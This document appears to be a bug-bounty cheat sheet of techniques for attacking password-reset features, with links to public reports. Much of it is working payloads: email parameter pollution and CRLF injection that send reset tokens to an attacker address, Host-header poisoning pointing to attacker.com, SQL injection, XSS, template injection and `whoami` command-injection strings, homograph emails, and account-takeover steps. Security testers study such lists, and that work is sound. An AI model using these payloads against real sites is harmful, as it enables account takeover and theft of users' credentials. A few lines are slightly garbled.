### Reset Password 
[All About Password Reset Vulnerability](https://infosecwriteups.com/all-about-password-reset-vulnerabilities-3bba86ffedc7) 

[10-Password-reset-flaws](https://anugrahsr.github.io/posts/10-Password-reset-flaws/#10-try-using-your-token)

- Password reset with manipulating email parameter:[1175081](https://hackerone.com/reports/1175081)
    ```
        JSON: {"email":["victim@gmail.com","attacker@gmail.com"]} 
        {"email":"victim@gmail.com","email":"attacker@gmail.com"}
        {"email":"victim@mail.com","hacker@mail.com"}

        Double parameter: email=victim@gmail.com&email=attacker@gmail.com
        email[]=victim@gmail.com&email[]=attacker@gmail.com
        email=victim@mail.com%00hacker@mail.com

        carbon copy: email=victim@xyz.tld%0a%0dcc:hacker@xyz.tld
                     email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"

        Using separators: email=victim@xyz.tld,hacker@xyz.tld
                        mail=victim@gmail.com%20email=attacker@gmail.com
                        email=victim@gmail.com|email=attacker@gmail.com
    ```
    

    - Password reset token leakage via Referer Header [272379](https://hackerone.com/reports/342693) [272379](https://hackerone.com/reports/272379)

    - Host Header Poisoning [https://hackerone.com/reports/226659] [https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html]   [https://medium.com/@tameemkhalid/host-header-injection-on-password-reset-functionality-an-easy-p2-5c6263c2e3d4]

    ```
        Host: attacker.com

        Host: target.com
        X-Forwarded-Host: attacker.com

        Host: target.com
        Host: attacker.com
    ```

    - Token leakage in response/JS files - Search for the password reset token in the response of the request or in JS files.

    - Look for IDOR while resetting password through password reset link. Use paramminer to discover additional parameters or append previously known parameters (For example, you may find a parameter uid while updating your profile) in the request.

    - Modifying Request-URI
    ```
        POST https://attacker.com/forgot-password HTTP/1.1
        POST @attacker.com/forgot-password HTTP/1.1
        POST :@attacker.com/forgot-password HTTP/1.1
        POST /forgot-password@attacker.com HTTP/1.1
    ```
    Check if the password reset link is manipulated or not.

    - SQLi: ```test@test.com'+(select*from(select(sleep(2)))a)+'```

    - CRLF: ```POST/resetpassword?%0d%0aHost:%20attacker.com```

    - Append a .json after the endpoint.

    -  During registration and password reset use homograph in email. [EvilUrl](https://github.com/UndeadSec/EvilURL)
    ```
        email=victim@gmail.com
        email=victim@gmаil.com

        Using Unicode: Cyril ic Small Letter A
        email=victim@xn--gmil-63d.com

    Steps to reproduce:
        1. Create a new account with tuhin1729@gmail.com.xyz.burpcollaborator.net
        2. Go to password reset page and enter this email:
        tuhin1729@gmаil.com.xyz.burpcollaborator.net [Here "a" is different]
        If it's vulnerable then you'll get the password reset link to your collaborator
        server.

    ```

    - Append null bytes after your email and observe the response.
    ```
        %00, %0d%0a, %0d, %0a, %09, %0C, %20
        {"email":"attacker@gmail.com"}
        {"email":"attacker@gmail.com%00"}

    ```

    - Try XSS, SSTI, Command Injection etc in the email field.
    ```
        hello+(<script>alert(1)</script>)@gmail.com
        "<svg/onload=alert(1)>"@gmail.com
        "<%= 7 * 7 %>"@gmail.com
        hello+(${{7*7}})@gmail.com
        hello@`whoami`.xyz.burpcollaborator.net
    ```

    - Session/Token is not expiring after password reset. [https://hackerone.com/reports/244642]

    - Weak Password Policy - Add only space in password.

    - Request for 2 password reset links and try the older one.

    - Register with a username identical to the victim's username, but with white spaces inserted before and/or after the username("neasher ", " neasher " etc). Try a password reset for your account. Use the token to reset victim's password. A similar vulnerability was found in CTFd ([CVE-2020-7245](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-7245))

    - If they are sending an otp for password reset, try [2FA Bypass](https://github.com/neasher1/BUG-Hunting/blob/main/2FA-Bypass.md) techniques.

    - 2FA auto disabled after password reset.
   
    - Changing Email And Password of any User through API Parameters [https://ad3sh.medium.com/full-account-takeover-changing-email-and-password-of-any-user-through-api-parameters-3d527ab27240]
        - Full Account Takeover via Changing Email And Password of any User through API Parameters
Exploitation
            1. Attacker have to login with their account and Go to the Change password function
            2. Start the Burp Suite and Intercept the request
            3. After intercepting the request sent it to repeater and modify parameters Email and Password
            POST /api/changepass
            [...]
            ("form": {"email":"victim@email.tld","password":"12345678"})

    - Reset password link sent over unsecured http protocol [https://hackerone.com/reports/1888915]

    - User enumeration via Password reset page [https://hackerone.com/reports/1166054] [https://hackerone.com/reports/77067]

    - Logout CSRF [https://hackerone.com/reports/223329]

    - [Activation tokens are not expiring](https://hackerone.com/reports/223339)

    - Design Flaw in session management of password reset [https://hackerone.com/reports/229417]

    - weak cryptography issue [https://infosecwriteups.com/bugbounty-how-i-was-able-to-compromise-any-user-account-via-reset-password-functionality-a11bb5f863b3]

    - Response Manipulation: Replace Bad Response With Good One [https://medium.com/@innocenthacker/how-i-found-the-most-critical-bug-in-live-bug-bounty-event-7a88b3aa97b3]
        Response manipulation: Replace Bad Response With Good One
        ```
        Look for Request and Response like these
        HTTP/1.1 401 Unauthorized
        (“message”:”unsuccessful”,”statusCode:403,”errorDescription”:”Unsuccessful”)

        Change Response
        HTTP/1.1 200 OK
        (“message”:”success”,”statusCode:200,”errorDescription”:”Success”)
        ```

    - Failure to Invalid Session after Password Change [https://hackerone.com/reports/514577] [https://hackerone.com/reports/678050]

